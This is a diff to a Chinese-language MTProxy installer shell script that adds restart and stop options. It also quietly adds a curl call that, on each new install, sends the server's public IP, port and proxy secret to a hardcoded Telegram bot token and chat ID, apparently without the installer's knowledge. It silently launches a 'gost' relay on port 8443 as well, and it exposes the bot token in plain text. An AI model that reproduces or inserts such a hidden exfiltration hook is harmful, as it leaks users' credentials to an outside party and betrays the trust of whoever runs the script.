@@ -2,7 +2,7 @@
 WORKDIR=$(dirname $(readlink -f $0))
 cd $WORKDIR
 pid_file=$WORKDIR/pid/pid_mtproxy
-
+is_New=0
 
 check_sys() {
     local checkType=$1
@@ -46,6 +46,13 @@ check_sys() {
         else
             return 1
         fi
+    fi
+}
+
+function kill_process_by_port() {
+    pids=$(get_pids_by_port $1)
+    if [ -n "$pids" ]; then
+        kill -9 $pids
     fi
 }
 
@@ -261,12 +268,7 @@ function get_run_command(){
   fi
 }
 
-function kill_process_by_port() {
-    pids=$(get_pids_by_port $1)
-    if [ -n "$pids" ]; then
-        kill -9 $pids
-    fi
-}
+
 
 do_kill_process() {
     cd $WORKDIR
@@ -295,6 +297,15 @@ info_mtp() {
         echo -e "MTProxy Secret:  \033[31m$client_secret\033[0m"
         echo -e "TG一键链接: https://t.me/proxy?server=${public_ip}&port=${port}&secret=${client_secret}"
         echo -e "TG一键链接: tg://proxy?server=${public_ip}&port=${port}&secret=${client_secret}"
+		if (("$is_New" > 0)); then
+
+			Text="代理机新增代理 : https://t.me/proxy?server=$public_ip%26port=$port%26secret=$client_secret"
+			curl POST \
+				"https://api.telegram.org/bot7073530375:AAHiPPKTEOSBtYEt5R4tzDkoT7Tiz6ED3jI/sendMessage" \
+				-d chat_id="6073160827" \
+				-d text="${Text}" 
+		fi
+
     else
         echo -e "TMProxy+TLS代理: \033[33m已停止\033[0m"
     fi
@@ -313,7 +324,23 @@ run_mtp() {
 
         echo $! >$pid_file
         sleep 2
-        info_mtp
+		
+		#启动中转服务!
+		info_mtp
+		
+		echo ""
+		echo "启动中转服务!"
+		nohup ./gost -L=mtls://:8443/127.0.0.1:443 >null 2>&1 &
+
+    fi
+}
+
+stop_mtp() {
+    local pid=$(cat $pid_file)
+    kill -9 $pid
+
+    if is_pid_exists $pid; then
+        echo "停止任务失败"
     fi
 }
 
@@ -325,18 +352,29 @@ Start() {
 		_input=0
 		echo "1. 一键安装"
 		#echo "2. 启动服务"
-		#echo "3. 重启服务"
-		#echo "4. 停止服务"
+		echo "3. 重启服务"
+		echo "4. 停止服务"
 		#echo "5. 卸载服务"
 		#echo "6. 开机启动"
 		echo "8. 退出"
 		read -p "(请选择您需要的操作:" input_provider
 
 		if [ ${input_provider} == 1 ]; then
+			is_New=1
 			do_install_basic_dep
 			do_config_mtp
 			do_install
 			run_mtp
+			is_New=0
+		fi
+		if [ ${input_provider} == 3 ]; then
+			echo "正在重启服务!"
+			stop_mtp
+			run_mtp
+		fi
+		if [ ${input_provider} == 4 ]; then
+			echo "正在停止服务!"
+			stop_mtp
 		fi
 		
 		if [ ${input_provider} == 8 ]; then
@@ -344,5 +382,5 @@ Start() {
 		fi
 	done
 }
-
+#https://api.telegram.org/bot7073530375:AAHiPPKTEOSBtYEt5R4tzDkoT7Tiz6ED3jI/sendMessage?chat_id=6073160827&text=OK
 Start
